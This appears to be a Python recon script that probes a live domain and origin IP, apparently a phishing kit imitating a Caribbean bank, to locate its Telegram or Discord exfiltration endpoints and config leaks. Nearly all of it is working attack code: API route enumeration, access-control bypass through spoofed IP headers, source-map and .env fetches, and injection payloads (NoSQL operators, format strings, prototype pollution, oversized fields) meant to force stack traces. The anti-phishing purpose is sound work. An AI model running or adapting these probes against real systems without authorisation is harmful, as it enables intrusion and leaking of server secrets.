#!/usr/bin/env python3
"""
Phase 2 probing: hunt for Telegram / Discord / Signal exfil endpoints
and server-side config leaks on cibccaribbeanid.icu

Angles:
  A. Real Next.js API route handlers at /api/<name>
     (static routes beat the [id] dynamic segment — a real
      app/api/webhook/route.ts would be served here directly)
  B. IP-spoof headers — if middleware trusts X-Forwarded-For
     we might unlock /login and other gated routes without bypass
  C. Source-map files for known JS chunks
  D. Error-induction payloads against the Server Action
     (try to get a stack trace / env-var leak, not just a digest)
  E. Direct port 3000 probe (bypasses reverse proxy / TLS middleware)
"""

import asyncio
import json
import sys
from datetime import datetime, timezone

import httpx

TARGET = "https://cibccaribbeanid.icu"
ACTION_ID = "7fbd36e5371f9b7bf4658498f5c0d2e205e3c568fa"
BUILD_ID = "jS7HLfsNPkrJunzq3p8j-"
RESULTS_FILE = "recon/phase2_results.json"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
BASE_HEADERS = {
    "User-Agent": BROWSER_UA,
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}

results: list[dict] = []


def log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def is_interesting(status: int, body: str, location: str) -> bool:
    """Anything that isn't a 308→/not-allowed or a flat 404."""
    if status == 308 and "not-allowed" in location:
        return False
    if status == 404 and not body.strip():
        return False
    return True


# ──────────────────────────────────────────────────────────────
# GET probe
# ──────────────────────────────────────────────────────────────
async def probe_get(
    client: httpx.AsyncClient,
    path: str,
    label: str,
    extra_headers: dict | None = None,
    base: str = TARGET,
) -> dict:
    url = base + path
    hdrs = {**BASE_HEADERS, **(extra_headers or {})}
    try:
        r = await client.get(url, headers=hdrs, follow_redirects=False, timeout=10)
        body_preview = r.text[:400].replace("\n", " ")
        location = r.headers.get("location", "")
        ct = r.headers.get("content-type", "")
        interesting = is_interesting(r.status_code, r.text, location)
        result = {
            "label": label,
            "method": "GET",
            "url": url,
            "status": r.status_code,
            "content_type": ct,
            "location": location,
            "body_len": len(r.content),
            "body_preview": body_preview,
            "interesting": interesting,
        }
        flag = "  *** INTERESTING ***" if interesting else ""
        log(f"GET  {url} → {r.status_code} {ct[:30]}{flag}")
        return result
    except Exception as exc:
        log(f"GET  {url} → ERROR {exc}")
        return {"label": label, "method": "GET", "url": url, "error": str(exc)}


# ──────────────────────────────────────────────────────────────
# Server Action POST probe
# ──────────────────────────────────────────────────────────────
async def probe_action(
    client: httpx.AsyncClient,
    path: str,
    payload: list,
    label: str,
) -> dict:
    url = TARGET + path
    body_bytes = json.dumps(payload).encode()
    hdrs = {
        **BASE_HEADERS,
        "Content-Type": "text/plain;charset=UTF-8",
        "Next-Action": ACTION_ID,
        "Accept": "text/x-component",
    }
    try:
        t0 = asyncio.get_event_loop().time()
        r = await client.post(
            url, content=body_bytes, headers=hdrs, follow_redirects=False, timeout=20
        )
        elapsed = asyncio.get_event_loop().time() - t0
        body = r.text[:600]
        interesting = r.status_code not in (308, 404) or "E{" in body
        result = {
            "label": label,
            "method": "POST_ACTION",
            "url": url,
            "payload_event": payload[0] if payload else None,
            "status": r.status_code,
            "elapsed_s": round(elapsed, 3),
            "body": body,
            "interesting": interesting,
        }
        flag = "  *** INTERESTING ***" if interesting else ""
        log(
            f"POST {url} [{label}] → {r.status_code} {elapsed:.2f}s  {body[:60]!r}{flag}"
        )
        return result
    except Exception as exc:
        log(f"POST {url} [{label}] → ERROR {exc}")
        return {"label": label, "method": "POST_ACTION", "url": url, "error": str(exc)}


# ──────────────────────────────────────────────────────────────
# Direct IP GET (no TLS, bypasses reverse proxy)
# ──────────────────────────────────────────────────────────────
async def probe_direct(
    client: httpx.AsyncClient,
    url: str,
    label: str,
) -> dict:
    try:
        r = await client.get(
            url, headers=BASE_HEADERS, follow_redirects=False, timeout=8
        )
        body_preview = r.text[:300].replace("\n", " ")
        interesting = r.status_code < 400
        result = {
            "label": label,
            "method": "GET_DIRECT",
            "url": url,
            "status": r.status_code,
            "headers": dict(r.headers),
            "body_preview": body_preview,
            "interesting": interesting,
        }
        flag = "  *** INTERESTING ***" if interesting else ""
        log(f"DIRECT {url} → {r.status_code}{flag}")
        return result
    except Exception as exc:
        log(f"DIRECT {url} → ERROR {exc}")
        return {"label": label, "method": "GET_DIRECT", "url": url, "error": str(exc)}


# ══════════════════════════════════════════════════════════════
async def run() -> None:

    async with httpx.AsyncClient(
        verify=True, follow_redirects=False, timeout=12
    ) as client:
        # ── Phase A: Real Next.js API route handlers ───────────────────────
        # In Next.js App Router, a file at app/api/foo/route.ts maps to /api/foo
        # and BEATS the [id] dynamic segment. So if the kit has a real webhook
        # handler, a GET/POST to /api/<name> will hit it directly.
        log("\n=== Phase A: API route handler discovery ===")
        api_candidates = [
            # ── messaging / exfil ──
            "webhook",
            "telegram",
            "tg",
            "tgbot",
            "discord",
            "disc",
            "signal",
            "notify",
            "notification",
            "notif",
            "send",
            "sender",
            "message",
            "msg",
            "forward",
            "relay",
            "push",
            "bot",
            "botapi",
            # ── admin / config ──
            "admin",
            "panel",
            "dashboard",
            "manage",
            "config",
            "settings",
            "setup",
            "health",
            "ping",
            "status",
            "info",
            "env",
            "debug",
            # ── generic handler names ──
            "callback",
            "hook",
            "receive",
            "handler",
            "collect",
            "gatherer",
            "report",
            "log",
            "logs",
            "data",
            "events",
            "track",
            "update",
            "sync",
        ]
        for name in api_candidates:
            r = await probe_get(client, f"/api/{name}", f"api_route_{name}")
            results.append(r)
            await asyncio.sleep(0.25)

        # ── Phase B: IP-spoof header experiments ──────────────────────────
        # If middleware reads X-Forwarded-For / X-Real-IP to determine the
        # client IP, setting it to 127.0.0.1 may make it think the request
        # is local and skip the bot/geo block entirely.
        log("\n=== Phase B: IP-spoof header experiments ===")
        spoof_targets = ["/login", "/api/login", "/"]
        spoof_header_sets = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "::1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
        ]
        for path in spoof_targets:
            for extra in spoof_header_sets:
                label = f"spoof_{path.strip('/')}_{list(extra.keys())[0]}"
                r = await probe_get(client, path, label, extra_headers=extra)
                results.append(r)
                await asyncio.sleep(0.3)

        # ── Phase C: Source map files ─────────────────────────────────────
        # If Next.js was built without disabling source maps (productionBrowserSourceMaps),
        # .js.map files exist alongside the JS chunks and contain original source.
        # The server-action code is server-side so won't appear here, but the
        # layout chunk references env var names (NEXT_PUBLIC_*) which might give clues.
        log("\n=== Phase C: Source map probing ===")
        # Filenames taken from the downloaded chunks
        chunk_names = [
            "app/layout-502b8f3b4c8af488.js",
            "app/[id]/login/page-100d4d593efe01a7.js",
            "app/[id]/confirmation/page-79232b24dbd47f7f.js",
            "app/[id]/billing/page-17104f6b0c35442d.js",
            "app/[id]/document/page-431266ca46aa8ac3.js",
            "211-98290cf7eeb904d8.js",
            "336-024991fc9026beab.js",
            "509-3e5877b939fd87a8.js",
            "726-50c2145ce83b58b7.js",
        ]
        for chunk in chunk_names:
            path = f"/_next/static/chunks/{chunk}.map"
            r = await probe_get(client, path, f"sourcemap_{chunk.split('/')[-1]}")
            results.append(r)
            await asyncio.sleep(0.25)

        # Also check /_next/server/ paths (long shot; usually not served externally)
        server_paths = [
            f"/_next/server/app/[id]/login/page.js",
            f"/_next/server/app/[id]/confirmation/page.js",
            f"/_next/server/app-paths-manifest.json",
            f"/_next/server/middleware-manifest.json",
            f"/_next/server/pages-manifest.json",
        ]
        for path in server_paths:
            r = await probe_get(client, path, f"server_{path.split('/')[-1]}")
            results.append(r)
            await asyncio.sleep(0.25)

        # ── Phase D: Error induction against the Server Action ────────────
        # We want a raw stack trace / env-var leak, not just a Next.js error digest.
        # Strategies:
        #   1. Send None/null for required fields (triggers type errors)
        #   2. Pass an object where a string is expected (JSON parse errors)
        #   3. Force a file-processing error on the DOCUMENT endpoint
        #   4. Overflow the sessionId / payload size
        #   5. Unicode / special chars that might break server-side templating
        log("\n=== Phase D: Error-induction payloads ===")
        error_cases = [
            # Trigger a TypeError by passing wrong types
            (
                "DOCUMENT_null_files",
                "/api/document",
                [
                    "DOCUMENT",
                    {
                        "front": None,
                        "back": None,
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
            (
                "DOCUMENT_bad_base64",
                "/api/document",
                [
                    "DOCUMENT",
                    {
                        "front": "!!!NOT_BASE64!!!",
                        "back": "!!!NOT_BASE64!!!",
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
            (
                "DOCUMENT_huge_front",
                "/api/document",
                [
                    "DOCUMENT",
                    {
                        "front": "data:image/png;base64," + "iVBOR" * 2000,
                        "back": "x",
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
            # Pass nested objects where scalar expected
            (
                "LOGIN_nested_creds",
                "/api/login",
                [
                    "LOGIN",
                    {
                        "logins": {
                            "1": {
                                "username": {"$type": "string"},
                                "password": {"$ne": None},
                            }
                        },
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
            # Empty-string event name
            (
                "empty_event",
                "/api/login",
                ["", {"sessionId": "X", "recaptchaToken": "x"}],
            ),
            # Numeric event
            (
                "numeric_event",
                "/api/login",
                [42, {"sessionId": "X", "recaptchaToken": "x"}],
            ),
            # Payload not an array at all (raw object)
            # — send as raw JSON object so the RSC deserializer gets confused
            ("not_array_payload", "/api/login", {"event": "LOGIN", "sessionId": "X"}),
            # Very long sessionId (potential buffer/log overflow)
            (
                "huge_session_id",
                "/api/login",
                [
                    "LOGIN",
                    {
                        "logins": {"1": {"username": "a", "password": "b"}},
                        "sessionId": "S" * 8000,
                        "recaptchaToken": "x",
                    },
                ],
            ),
            # Unicode null bytes / format strings
            (
                "unicode_injection",
                "/api/login",
                [
                    "LOGIN",
                    {
                        "logins": {
                            "1": {
                                "username": "\x00\u202e\ufeff",
                                "password": "%s%s%s%n",
                            }
                        },
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
            # Prototype pollution
            (
                "proto_pollution",
                "/api/login",
                [
                    "LOGIN",
                    {
                        "__proto__": {"admin": True},
                        "constructor": {"prototype": {"admin": True}},
                        "logins": {"1": {"username": "x", "password": "x"}},
                        "sessionId": "X",
                        "recaptchaToken": "x",
                    },
                ],
            ),
        ]
        for label, path, payload in error_cases:
            r = await probe_action(client, path, payload, label)
            results.append(r)
            await asyncio.sleep(0.5)

    # ── Phase E: Direct port-3000 probing ─────────────────────────────────
    # Hit Node.js directly — no TLS cert verification, no reverse-proxy
    # middleware. Might expose different routes / headers / error pages.
    log("\n=== Phase E: Direct IP:3000 probing ===")
    async with httpx.AsyncClient(
        verify=False, follow_redirects=False, timeout=8
    ) as raw:
        direct_targets = [
            "http://188.166.36.41:3000/",
            "http://188.166.36.41:3000/api/login",
            "http://188.166.36.41:3000/login",
            "http://188.166.36.41:3000/api/webhook",
            "http://188.166.36.41:3000/api/telegram",
            "http://188.166.36.41:3000/api/discord",
            "http://188.166.36.41:3000/api/notify",
            "http://188.166.36.41:3000/api/health",
            "http://188.166.36.41:3000/.env",
            "http://188.166.36.41:3000/api/config",
            # Also try 8080 / 443 in case there's another service
            "http://188.166.36.41:8080/",
            "http://188.166.36.41/",
        ]
        for url in direct_targets:
            label = (
                "direct_" + url.split("/", 3)[-1].replace("/", "_").strip("_") or "root"
            )
            r = await probe_direct(raw, url, label)
            results.append(r)
            await asyncio.sleep(0.4)

    # ── Save + summarise ──────────────────────────────────────────────────
    with open(RESULTS_FILE, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2, ensure_ascii=False)

    interesting = [r for r in results if r.get("interesting")]
    log(f"\n✓ Saved {len(results)} results to {RESULTS_FILE}")
    log(f"  Interesting (non-404/non-308→not-allowed): {len(interesting)}")

    if interesting:
        log("\n══ INTERESTING RESULTS ══════════════════════════════════")
        for r in interesting:
            log(
                json.dumps(
                    {
                        k: v
                        for k, v in r.items()
                        if k != "body_preview" or len(str(v)) < 200
                    },
                    indent=2,
                )
            )


if __name__ == "__main__":
    asyncio.run(run())
